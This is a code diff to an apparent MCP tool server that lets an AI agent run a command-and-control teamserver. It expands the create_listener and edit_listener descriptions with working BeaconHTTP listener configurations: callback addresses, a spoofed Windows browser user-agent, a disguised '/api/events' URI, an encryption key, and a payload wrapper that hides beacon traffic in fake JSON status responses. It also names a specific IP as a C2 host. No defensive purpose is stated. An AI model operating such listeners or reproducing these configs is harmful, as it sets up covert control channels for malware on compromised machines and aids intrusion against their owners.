@@ -134,9 +134,28 @@ def register_agent_tools(mcp: FastMCP, ctx: ToolContext) -> None:
         "Start a new listener on the teamserver.\n"
         "Args:\n"
         "  name : STRING — Listener name (e.g. 'my-http').\n"
-        "  config_type : STRING — Listener type (e.g. 'beacon_http', 'beacon_dns', 'beacon_smb', 'beacon_tcp').\n"
-        "  config : STRING — JSON/YAML configuration string for the listener.\n"
-        "Example: create_listener('my-http', 'beacon_http', '{\"port\":8080,\"host\":\"0.0.0.0\"}')"
+        "  config_type : STRING — Listener type (e.g. 'BeaconHTTP', 'GopherTCP', 'beacon_dns', 'beacon_smb', 'beacon_tcp').\n"
+        "  config : STRING — JSON configuration string for the listener.\n"
+        "\n"
+        "IMPORTANT — host_header must include :port when using BeaconHTTP:\n"
+        "  beacon sends Host header as 'ip:port' but C2 validates exact match.\n"
+        "  WRONG: \"host_header\":[\"43.156.61.27\"]    → beacon sends \"43.156.61.27:443\" → 404\n"
+        "  RIGHT: \"host_header\":[\"43.156.61.27:443\"] → matches exactly → agent connects\n"
+        "\n"
+        "Example: create_listener('C2HTTP', 'BeaconHTTP', "
+        "'{\"host_bind\":\"0.0.0.0\",\"port_bind\":443,\"callback_addresses\":[\"1.2.3.4:443\"],"
+        "\"protocol\":\"http\",\"http_method\":\"POST\",\"uri\":[\"/api/events\"],"
+        "\"hb_header\":\"X-Session-ID\","
+        "\"user_agent\":[\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"],"
+        "\"host_header\":[\"1.2.3.4:443\"],\"ssl\":false,"
+        "\"encrypt_key\":\"0123456789abcdef0123456789abcdef\","
+        "\"page-payload\":\"{\\\"status\\\":\\\"ok\\\",\\\"data\\\":\\\"<<<PAYLOAD_DATA>>>\\\",\\\"metrics\\\":\\\"sync\\\"}\","
+        "\"page-error\":\"404\"}'\n"
+        "\n"
+        "Agent types:\n"
+        "  beacon  → use config_type 'BeaconHTTP'. host_header MUST include :PORT.\n"
+        "  gopher  → use config_type 'GopherTCP'.\n"
+        "  beacon_dns / beacon_smb / beacon_tcp → other Beacon transport types."
     ))
     async def create_listener(name: str, config_type: str, config: str) -> str:
         name = validate_nonempty(name, "name")
@@ -194,8 +213,15 @@ def register_agent_tools(mcp: FastMCP, ctx: ToolContext) -> None:
 
     @mcp.tool(description=(
         "Edit an existing listener's configuration.\n"
-        "Args: name (STR), config_type (STR), config (STR) — new config JSON/YAML.\n"
-        "Example: edit_listener('my-http', 'beacon_http', '{\"port\":9090,\"host\":\"0.0.0.0\"}')"
+        "Args: name (STR), config_type (STR), config (STR) — new config JSON.\n"
+        "\n"
+        "IMPORTANT — host_header must include :port for BeaconHTTP:\n"
+        "  WRONG: \"host_header\":[\"43.156.61.27\"]\n"
+        "  RIGHT: \"host_header\":[\"43.156.61.27:443\"]\n"
+        "\n"
+        "Example: edit_listener('C2HTTP', 'BeaconHTTP', "
+        "'{\"host_bind\":\"0.0.0.0\",\"port_bind\":443,\"callback_addresses\":[\"1.2.3.4:443\"],"
+        "\"host_header\":[\"1.2.3.4:443\"]}')"
     ))
     async def edit_listener(name: str, config_type: str, config: str) -> str:
         name = validate_nonempty(name, "name")
